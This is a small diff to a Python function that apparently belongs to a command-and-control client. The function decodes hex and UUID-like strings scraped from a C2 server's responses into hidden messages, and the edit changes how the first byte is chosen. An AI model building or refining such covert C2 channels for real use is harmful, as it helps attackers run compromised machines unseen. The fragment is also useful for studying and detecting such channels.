@@ -117,9 +117,7 @@ def send_receive_request(url, order_received = None, additional_data_received = 
   else:
     print("error when sending the data requested by the C2 server")
 
-
   body_request = request.text
-
 
   regex_list = re.findall(r"""[0-9a-f-]{36}|[0-9a-f]{32}|[0-9a-f]{16}""", body_request)
 
@@ -128,7 +126,7 @@ def send_receive_request(url, order_received = None, additional_data_received = 
 
   regex_string = "".join([k.replace("-", "") for k in regex_list])
 
-  byte_message = ord("a") # necessary to change that, the first byte may not be the same
+  byte_message = ord(body_request[0]) # necessary to change that, the first byte may not be the same
 
   message_hex = binascii.unhexlify(regex_string.encode("ISO-8859-1"))
 
